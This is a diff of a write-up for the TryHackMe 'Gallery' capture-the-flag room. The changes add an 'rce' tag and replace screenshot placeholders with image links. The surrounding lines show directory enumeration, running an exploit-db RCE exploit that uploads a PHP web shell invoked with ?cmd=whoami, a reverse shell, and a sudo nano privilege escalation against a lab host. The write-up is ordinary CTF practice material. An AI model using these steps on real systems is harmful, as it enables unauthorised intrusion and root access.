@@ -4,7 +4,7 @@ date: 2025-01-30
 image: /assets/img/tryhackme/Gallery/Gallery_image.jpg
 description: Writeup of the TryHackMe-CTF Gallery
 categories: [Tryhackme, Easy]
-tags: [linux, privesc, web, enumeration]
+tags: [linux, privesc, web, enumeration, rce]
 ---
 
 ## Challenge Description
@@ -103,7 +103,7 @@ $ gobuster dir --url http://10.10.180.20/ --wordlist /usr/share/wordlists/dirbus
 
 The directory `/gallery` showed a Login screen. With the name of the CMS I found an <a href="https://www.exploit-db.com/exploits/50214">exploit-db</a> entry which can get me remote code execution. The exploit code shows how to bypass the login, but after logging in this didn't reveal anything.
 
-screen 1
+![Dashboard](/assets/img/tryhackme/Gallery/thm_gallery_1.jpg)
 
 ```bash
 $ python3 exploit.py
@@ -123,7 +123,7 @@ shell uploading
 Shell URL : http://10.10.180.20/gallery/uploads/1738236540_TagoenmcpbdzviklgpmLetta.php?cmd=whoami
 
 ```
-screen 2
+![Remote Command Execution](/assets/img/tryhackme/Gallery/thm_gallery_2.jpg)
 
 I was able to get a reverse shell shell:
 ```html
@@ -249,7 +249,7 @@ mike@gallery:~$ sudo /bin/bash /opt/rootkit.sh
 ```
 In `nano` press CTRL + R then CTRL + X and insert the command:
 
-screen 3
+![nano privesc](/assets/img/tryhackme/Gallery/thm_gallery_3.jpg)
 
 ```bash
 # whoami
